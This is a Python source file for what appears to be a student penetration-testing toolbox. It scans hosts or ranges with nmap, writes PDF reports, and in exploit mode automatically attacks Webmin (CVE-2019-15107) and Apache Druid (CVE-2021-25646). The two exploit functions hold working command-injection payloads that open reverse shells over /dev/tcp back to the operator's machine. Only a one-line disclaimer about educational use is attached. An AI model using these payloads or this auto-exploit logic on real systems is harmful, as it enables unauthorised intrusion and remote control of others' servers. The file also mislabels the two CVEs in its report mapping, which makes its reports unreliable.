import csv
import nmap
import requests
import subprocess
import ipaddress
import sys
import argparse
import netifaces as ni
import reportlab
from tqdm import tqdm
from reportlab.lib import colors
from reportlab.lib.pagesizes import letter
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle


BLUE = "\033[94m"
GREEN = "\033[92m"
RED = "\033[31m"
ENDC = "\033[0m"

def display_banner():
    banner = """
████████╗ ██████╗  ██████╗ ██╗     ██████╗  ██████╗ ██╗  ██╗
╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔══██╗██╔═══██╗╚██╗██╔╝
   ██║   ██║   ██║██║   ██║██║     ██████╔╝██║   ██║ ╚███╔╝ 
   ██║   ██║   ██║██║   ██║██║     ██╔══██╗██║   ██║ ██╔██╗ 
   ██║   ╚██████╔╝╚██████╔╝███████╗██████╔╝╚██████╔╝██╔╝ ██╗
   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝
         Justine Fort - Evan Dessert - Mathis Fecan          
"""
    print(BLUE + banner + ENDC)

# Function that get the IP from the host that runs the toolbox.
def get_current_ip():
    try:
        interfaces = ni.interfaces()
        
        for interface in interfaces:
            addresses = ni.ifaddresses(interface)
            if ni.AF_INET in addresses:

                ip_info = addresses[ni.AF_INET][0]
                lhost = ip_info['addr']
                
                if not lhost.startswith('127.') and not lhost.startswith('169.254.'):
                    return lhost
    except Exception as e:
        print("Error:", e)

# Function to validate an IP address format
def validate_ip_address(ip_address):
    try:
        ipaddress.ip_address(ip_address)
        return True
    except ValueError:
        return False

# Function to validate a network range address format
def validate_network_range(network_range):
    if "/" not in network_range:
        return False  
    try:
        ipaddress.ip_network(network_range)
        return True
    except ValueError:
        return False  

# Function to ask the user if he wants to scan an IP or a network range.
def choose_scan_type():
    while True:
        try:
            scan_type = input("Do you want to scan an IP or a range? (I/R): ").lower()
            if scan_type == 'i' or scan_type == 'r':
                return scan_type
            else:
                raise ValueError(RED + "Invalid input. Please enter 'IP' or 'range'." + ENDC)
        except ValueError as ve:
            print(ve)

# Function to ask the user for the IP/Network address. 
def ask_ip_range(scan_type):
    if scan_type == "i":
        while True:
            adresse_ip = input(ENDC + "Provide an IP address : ")
            if validate_ip_address(adresse_ip):
                return adresse_ip
                break
            else:
                print(RED +"Invalid IP address format. Please provide a valid IP." + ENDC)
    elif scan_type == "r":
        while True:
            network_range = input(ENDC + "Provide a network range in CIDR (192.168.1.0/24) : ")
            if validate_network_range(network_range):
                return network_range
                break
            else:
                print(RED +"Invalid network address format. Please provide a valid network range.")

# Function to ask the user if he wants to do a deep scan. Executed after network discovery is done.
def net_fullscan_ask():
    net_fullscan_asking = input(ENDC + "Do you want to run a deep scan for each discovered host ? (Y/n)").lower()
    if net_fullscan_asking == "o" or net_fullscan_asking == "":
        net_fullscan = True
    else:
        net_fullscan = False
        print("Exiting script")
    return net_fullscan

# Function discover open ports on an IP.
def simple_scan(adresse_ip):
    result_list = []
    scanner = nmap.PortScanner()
    try:
        scanner.scan(adresse_ip, arguments='-T5 -Pn')
    except nmap.PortScannerError as e:
        print("Error while analysing the IP address :", e)
        return None, None
    for host in scanner.all_hosts():
        if 'tcp' in scanner[host]:
            for port in scanner[host]['tcp'].keys():
                state = scanner[host]['tcp'][port]['state']
                if state == 'open':
                    result_list.append(port)
    try:
        if not (result_list):
            raise ValueError(RED + "❌ No open port found on the specified host." + ENDC)
        else :
            print (f"Open ports: {str(result_list)}\n")
        return result_list
    except ValueError as ve:
        print(ve)
        sys.exit(1)

def network_simple_scan(network_range,lhost):
    hosts_list = []
    scanner = nmap.PortScanner()
    try:
        scanner.scan(network_range, arguments='-T5 -sn -PU -PS -PA')
    except nmap.PortScannerError as e:
        print("Error while analysing the network :", e)
        sys.exit(1)
        return None, None
    for host in scanner.all_hosts():
        if host != lhost:
            hosts_list.append(host)
            hostcount = len(hosts_list)
    try:
        if not (hosts_list):
            raise ValueError(RED + "❌ No available host found on the specified network." + ENDC)
        else :
            print (BLUE + f"Available Hosts:{ENDC}\n{hosts_list}\n")
            print (BLUE + f"Number of available hosts : {hostcount}")
        return network_range and hosts_list
    except ValueError as ve:
        print(ve)
        sys.exit(1)

# Function to perform a detailed scan on each port discoverd on the IP.
def better_scan(adresse_ip, open_ports):
    result_dict = {} 
    scanner = nmap.PortScanner()

    try:
        scanner.scan(adresse_ip, arguments='-T5 -Pn -sV') 
    except nmap.PortScannerError as e:
        print(f"Error scanning host {adresse_ip}: {e}")
        return None

    for port in open_ports:
        try:
            scan_result = scanner[adresse_ip]['tcp'][port]
            protocol = 'tcp'
            port_number = port
            service_name = scan_result['name']
            state = scan_result['state']
            product = scan_result['product'] if 'product' in scan_result else None
            extra_info = scan_result['extrainfo'] if 'extrainfo' in scan_result else None
            version = scan_result['version'] if 'version' in scan_result else None
            
            print(GREEN + f"  Port: {port_number}" + ENDC)
            print(f"    Service: {service_name}")
            print(f"    State: {state}")
            print(f"    Product: {product}")
            print(f"    Version: {version}")
            print(f"    Extra Info: {extra_info}")
            
            # Check for CVEs
            vulnerability_detected = check_CVEs(service_name, product, extra_info, version)

            # Store scan results in the dictionary
            if adresse_ip not in result_dict:
                result_dict[adresse_ip] = {'hostname': scanner[adresse_ip].hostname(),
                                            'ports': {}}
            result_dict[adresse_ip]['ports'][port_number] = {'protocol': protocol,
                                                             'name': service_name,
                                                             'state': state,
                                                             'product': product,
                                                             'extrainfo': extra_info,
                                                             'version': version,
                                                             'vulnerability_detected': vulnerability_detected}
            
        except nmap.PortScannerError as e:
            print(f"Error scanning port {port}:", e)
            
    return result_dict

# Function to perform a detailed scan on each port discoverd on the IP. If a vulnerability is found, it will store this information to exploit it later.
def better_scan_exploit(adresse_ip, open_ports, lhost):
    result_dict = {} 
    scanner = nmap.PortScanner()

    try:
        scanner.scan(adresse_ip, arguments='-T5 -Pn -sV')
    except nmap.PortScannerError as e:
        print(f"Error scanning host {adresse_ip}: {e}")
        return None

    for port in open_ports:
        try:

            scan_result = scanner[adresse_ip]['tcp'][port]
            protocol = 'tcp'
            port_number = port
            service_name = scan_result['name']
            state = scan_result['state']
            product = scan_result['product'] if 'product' in scan_result else None
            extra_info = scan_result['extrainfo'] if 'extrainfo' in scan_result else None
            version = scan_result['version'] if 'version' in scan_result else None
            
            print(GREEN + f"  Port: {port_number}" + ENDC)
            print(f"    Service: {service_name}")
            print(f"    State: {state}")
            print(f"    Product: {product}")
            print(f"    Version: {version}")
            print(f"    Extra Info: {extra_info}")
            
            # Check for CVEs
            vulnerability_detected = check_CVEs(service_name, product, extra_info, version)

            # Store scan results in the dictionary
            if adresse_ip not in result_dict:
                result_dict[adresse_ip] = {'hostname': scanner[adresse_ip].hostname(),
                                            'ports': {}}
            result_dict[adresse_ip]['ports'][port_number] = {'protocol': protocol,
                                                             'name': service_name,
                                                             'state': state,
                                                             'product': product,
                                                             'extrainfo': extra_info,
                                                             'version': version,
                                                             'vulnerability_detected': vulnerability_detected}
        except nmap.PortScannerError as e:
            print(f"Error scanning port {port}:", e)

        if vulnerability_detected == 15107:
            exploit_CVE_2019_15107(result_dict,lhost, port_number, adresse_ip)
        elif vulnerability_detected == 25646:
            exploit_CVE_2021_25646(result_dict,lhost)

    return result_dict

# Function to perform a deep scan on each IP discovered during a network scan.
def network_fullscan(net_fullscan, hosts_list):
    result_dict_nw = {}  
    if net_fullscan:
        print("Starting deep scan on each host and port discovered...")
        with tqdm(total=len(hosts_list)) as pbar:
            for host in hosts_list:
                scanner = nmap.PortScanner()
                try:
                    scanner.scan(host, arguments='-T5 -Pn -F -sV')
                except nmap.PortScannerError as e:
                    print(f"Error scanning host {host}: {e}")
                    pbar.update(1)
                    continue
                
                if host not in scanner.all_hosts():
                    print(f"Host {host} not found in scan results.")
                    pbar.update(1)
                    continue
                
                if 'tcp' not in scanner[host]:
                    print(f"No ports found for host {host}.")
                    pbar.update(1)
                    continue

                open_ports = [p for p in scanner[host]['tcp'].keys() if scanner[host]['tcp'][p]['state'] == 'open']
                if not open_ports:
                    open_ports_str = "none"
                else:
                    open_ports_str = ", ".join(map(str, open_ports))
                print(f"Open ports for host {host}: {open_ports_str}")
                if open_ports:
                    result_dict_nw[host] = better_scan(host, open_ports)
                pbar.update(1)
    return result_dict_nw



# Function to perform a deep scan on each IP discovered during a network scan. If a vulnerability is found, it will store this information to exploit it later.
def network_fullscan_exploit(net_fullscan, hosts_list, lhost):
    result_dict_nw = {}  
    if net_fullscan:
        print("Starting deep scan on each host and port discovered...")
        with tqdm(total=len(hosts_list)) as pbar:
            for host in hosts_list:
                scanner = nmap.PortScanner()
                try:
                    scanner.scan(host, arguments='-T5 -Pn -F -sV')
                except nmap.PortScannerError as e:
                    print(f"Error scanning host {host}: {e}")
                    pbar.update(1)
                    continue
                
                if host not in scanner.all_hosts():
                    print(f"Host {host} not found in scan results.")
                    pbar.update(1)
                    continue
                
                if 'tcp' not in scanner[host]:
                    print(f"No ports found for host {host}.")
                    pbar.update(1)
                    continue

                open_ports = [p for p in scanner[host]['tcp'].keys() if scanner[host]['tcp'][p]['state'] == 'open']
                if not open_ports:
                    open_ports_str = "none"
                else:
                    open_ports_str = ", ".join(map(str, open_ports))
                print(f"Open ports for host {host}: {open_ports_str}")
                if open_ports:
                    result_dict_nw[host] = better_scan_exploit(host, open_ports, lhost)
                pbar.update(1)
    
    return result_dict_nw



# Function to check if an IP is vulnerable to one of the CVEs.
def check_CVEs(service_name, product, extra_info, version):
    if ('MiniServ' in product.lower() or 'webmin' in extra_info.lower()) and '1.910' in version:
        print(GREEN + "Vulnerability CVE-2019-15107 detected!" + ENDC)
        return 15107
    
    elif ('sun-answerbook' in service_name.lower()):
        print(GREEN + "Vulnerability CVE-2021-25646 detected!" + ENDC)
        return 25646
    else:
        print(RED + "No vulnerability found" + ENDC)
        return False

# Function to exploit CVE_2019_15107. This is the "POC" of the exploit. This exploits the CVE and sends back a reverse shell to the current device IP.
def exploit_CVE_2019_15107(result_dict,lhost,port_number, adresse_ip):
                target_ip = adresse_ip
                target_port = port_number 
                lport = "4443"
                vuln_path = "/password_change.cgi"

                exploit_cmd = (
                    f"curl -sk -X POST 'https://{target_ip}:{target_port}{vuln_path}' "
                    "-H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47' "
                    f"-H 'Referer: https://{target_ip}:{target_port}/' "
                    "-H 'Content-Type: application/x-www-form-urlencoded' "
                    f"-d 'expired=bash%20-c%20%270%3c%2666-%3bexec%2066%3c%3e/dev/tcp/{lhost}/{lport}%3bsh%20%3c%2666%20%3e%2666%202%3e%2666%27&new1=SmKUYgMFtixFlLt6nggby&new2=SmKUYgMFtixFlLt6nggby&old=bash%20-c%20%270%3c%2666-%3bexec%2066%3c%3e/dev/tcp/{lhost}/{lport}%3bsh%20%3c%2666%20%3e%2666%202%3e%2666%27'"
                )
                try:
                    subprocess.run(
                        exploit_cmd, shell=True, check=True, timeout=1, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                    )
                except subprocess.TimeoutExpired:
                    print(f"Exploit attempt done, reverse shell sent to Villain {lhost}")

# Function to exploit CVE_2021_25646. This is the "POC" of the exploit. This exploits the CVE and sends back a reverse shell to the current device IP.
def exploit_CVE_2021_25646(result_dict,lhost):
    for target_ip, details in result_dict.items():
        for port, port_details in details['ports'].items():
            if port_details['vulnerability_detected']:
                target_port = port
                lport = "4443"
                url = f"http://{target_ip}:{target_port}/druid/indexer/v1/sampler"

                headers = {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0",
                    "Accept": "application/json, text/plain, */*",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Content-Type": "application/json",
                }

                data = {
                    "type": "index",
                    "spec": {
                        "ioConfig": {
                            "type": "index",
                            "inputSource": {
                                "type": "inline",
                                "data": "{\"isRobot\":true,\"channel\":\"#x\",\"timestamp\":\"2021-2-1T14:12:24.050Z\",\"flags\":\"x\",\"isUnpatrolled\":false,\"page\":\"1\",\"diffUrl\":\"https://xxx.com\",\"added\":1,\"comment\":\"Botskapande Indonesien omdirigering\",\"commentLength\":35,\"isNew\":true,\"isMinor\":false,\"delta\":31,\"isAnonymous\":true,\"user\":\"Lsjbot\",\"deltaBucket\":0,\"deleted\":0,\"namespace\":\"Main\"}"
                            },
                            "inputFormat": {"type": "json", "keepNullColumns": True},
                        },
                        "dataSchema": {
                            "dataSource": "sample",
                            "timestampSpec": {"column": "timestamp", "format": "iso"},
                            "dimensionsSpec": {},
                            "transformSpec": {
                                "transforms": [],
                                "filter": {
                                    "type": "javascript",
                                    "dimension": "added",
                                    "function": f"function(value) {{java.lang.Runtime.getRuntime().exec('/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/{lhost}/{lport} 0>&1')}}",
                                    "": {"enabled": True},
                                },
                            },
                        },
                        "type": "index",
                        "tuningConfig": {"type": "index"},
                    },
                    "samplerConfig": {"numRows": 500, "timeoutMs": 15000},
                }

                response = requests.post(url, headers=headers, json=data)

                print("Exploit attempt done, reverse shell sent to Villain 192.168.1.72")


# Function to export a PDF file with the scan detail for a single IP scan.
def export_pdf_ip(result_dict):
    for ip, details in result_dict.items():
        doc_name = f"{ip}_report.pdf"
        doc = SimpleDocTemplate(doc_name)

        elements = []
        styles = getSampleStyleSheet()

        # Add title
        hostname = details['hostname']
        title = f"Scan report for {ip}"
        title_paragraph = Paragraph(title, styles['Title'])
        elements.append(title_paragraph)

        elements.append(Spacer(1, 12))

        # Add port details
        ip_data = [["Port", "Service", "State", "Product", "Version", "Extra Info", "Vulnerability"]]
        for port, port_details in details['ports'].items():
            port_number = port
            service = port_details['name']
            state = port_details['state']
            product = port_details['product']
            version = port_details['version']
            extra_info = port_details['extrainfo']
            vulnerability_code = port_details['vulnerability_detected']
            vulnerability = map_vulnerability_code(vulnerability_code)
            ip_data.append([port_number, service, state, product, version, extra_info, vulnerability])

        # Create a table for port details
        ip_table = Table(ip_data, repeatRows=1)
        ip_table.setStyle([('BACKGROUND', (0, 0), (-1, 0), colors.lightgrey),
                           ('TEXTCOLOR', (0, 0), (-1, 0), colors.black),
                           ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
                           ('FONTNAME', (0, 0), (-1, -1), 'Helvetica-Bold'),
                           ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
                           ('BACKGROUND', (0, 1), (-1, -1), colors.white),
                           ('GRID', (0, 0), (-1, -1), 1, colors.black)])
        elements.append(ip_table)
        elements.append(Spacer(1, 12))

        doc.build(elements)

        print(f"PDF export for {ip} done. Document saved as {doc_name}")

# Function to export a PDF file with the scan detail for a network range scan.
def export_pdf_range(result_dict_nw, hosts_list, network_range):
    network_range_filename = network_range.replace('/', '_')
    doc_name = f"{network_range_filename}_report.pdf"
    doc = SimpleDocTemplate(doc_name, pagesize=letter)

    elements = []
    styles = getSampleStyleSheet()

    # Add title
    title = f"Network Range Scan Report for {network_range}"
    title_paragraph = Paragraph(title, styles['Title'])
    elements.append(title_paragraph)

    # Add section for list of hosts within the network
    hosts_info = ", ".join(hosts_list)
    hosts_paragraph = Paragraph(f"Hosts in the Network: {hosts_info}", styles['Normal'])
    elements.append(hosts_paragraph)

    elements.append(Spacer(1, 12))

    # Add section with detailed scan information for each IP
    elements.append(Paragraph("Detailed scan of each IP:", styles['Heading1']))
    for ip, details in result_dict_nw.items():

        title_ip = f"Scan report for {ip}"
        title_paragraph_ip = Paragraph(title_ip, styles['Heading2'])
        elements.append(title_paragraph_ip)

        elements.append(Spacer(1, 6))

        ports = details[ip]['ports']

        ip_data = [["IP", "Port", "Service", "State", "Product", "Version", "Extra Info", "Vulnerability"]]
        for port, port_details in ports.items():
            port_number = port
            service = port_details.get('name', '')
            state = port_details.get('state', '')
            product = port_details.get('product', '')
            version = port_details.get('version', '')
            extra_info = port_details.get('extrainfo', '')
            vulnerability_code = port_details.get('vulnerability_detected', '')
            vulnerability = map_vulnerability_code(vulnerability_code)
            ip_data.append([ip, port_number, service, state, product, version, extra_info, vulnerability])

        ip_table = Table(ip_data, repeatRows=1)
        ip_table.setStyle(TableStyle([('BACKGROUND', (0, 0), (-1, 0), colors.lightgrey),
                                      ('TEXTCOLOR', (0, 0), (-1, 0), colors.black),
                                      ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
                                      ('FONTNAME', (0, 0), (-1, -1), 'Helvetica-Bold'),
                                      ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
                                      ('BACKGROUND', (0, 1), (-1, -1), colors.white),
                                      ('GRID', (0, 0), (-1, -1), 1, colors.black)]))
        elements.append(ip_table)
        elements.append(Spacer(1, 12))

    doc.build(elements)

    print(f"PDF export for {network_range}. Document saved as {doc_name}")


# Function to map the vulnerability code to the right CVE name.
def map_vulnerability_code(vulnerability_code):
    if vulnerability_code == 25646:
        return 'CVE_2019_15107'
    elif vulnerability_code == 15107:
        return 'CVE_2021_25646'
    else:
        return 'None'  

# Main script. This part is composed of the previous functions in order to make the toolbox work.
def main():
    parser = argparse.ArgumentParser(description="This script will make multiple scans on your network/hosts. It's meant to detect and/or exploit CVE-2019-15107 (Webmin 1.910) and CVE-2021-25646 (Apache Druid). This tool is developed for educational purposes, please use it only if you have explicit consent and authorization to do so.")
    parser.add_argument("-s", "--scan", action="store_true", help="Scan mode, this mode will attempt scans but will never exploit any vulnerability found.")
    parser.add_argument("-e", "--exploit", action="store_true", help="Exploit mode, this mode works exactly like scan mode BUT it will attempt to exploit any vulnerability found.")
    parser.add_argument("-o", "--output", action="store_true", help="Output option, this will generate a pdf file with the scan informations for the IP/Range scaned. Example : 192.168.1.10_report.pdf")

    args = parser.parse_args()

    display_banner()

    if args.scan and args.exploit:
        print("Error: You cannot use both scan mode (-s) and exploit mode (-e) at the same time. Please choose one.")
        sys.exit(1)

    if args.scan:
        print(GREEN + "🔍 Scan mode activated...🔍" + ENDC)
        lhost = get_current_ip()
        scan_type = choose_scan_type()

        # Prompt for network range scan
        if scan_type == "r":
            network_range = ask_ip_range(scan_type)
            hosts_list = network_simple_scan(network_range, lhost)
            net_fullscan = net_fullscan_ask()
            if net_fullscan: 
                result_dict_nw = network_fullscan(net_fullscan, hosts_list)
                if args.output:
                    export_pdf_range(result_dict_nw, hosts_list, network_range)
       
        # Prompt for single IP scan
        else:
            adresse_ip = ask_ip_range(scan_type)
            result_list = simple_scan(adresse_ip)
            result_dict = better_scan(adresse_ip, result_list)
            if args.output:
                export_pdf_ip(result_dict)

    elif args.exploit:
        print(RED + "🚨 Exploit mode (-e) activated, any CVE found will be exploited 🚨\nYou need to have Villain running in order to catch the reverse shells" + ENDC)
        lhost = get_current_ip()
        scan_type = choose_scan_type()
        if scan_type == "r":
            network_range = ask_ip_range(scan_type)
            hosts_list = network_simple_scan(network_range, lhost)
            net_fullscan = net_fullscan_ask()
            if net_fullscan:  # Check if net_fullscan is True
                result_dict_nw = network_fullscan_exploit(net_fullscan, hosts_list, lhost)
                if args.output:
                    export_pdf_range(result_dict_nw, hosts_list, network_range)
        
        # Prompt for single IP scan
        else:
            adresse_ip = ask_ip_range(scan_type)
            result_list = simple_scan(adresse_ip)
            result_dict = better_scan_exploit(adresse_ip, result_list, lhost)
            if args.output:
                export_pdf_ip(result_dict)
    else:
        parser.print_help()


# Runs the main scipt
main()
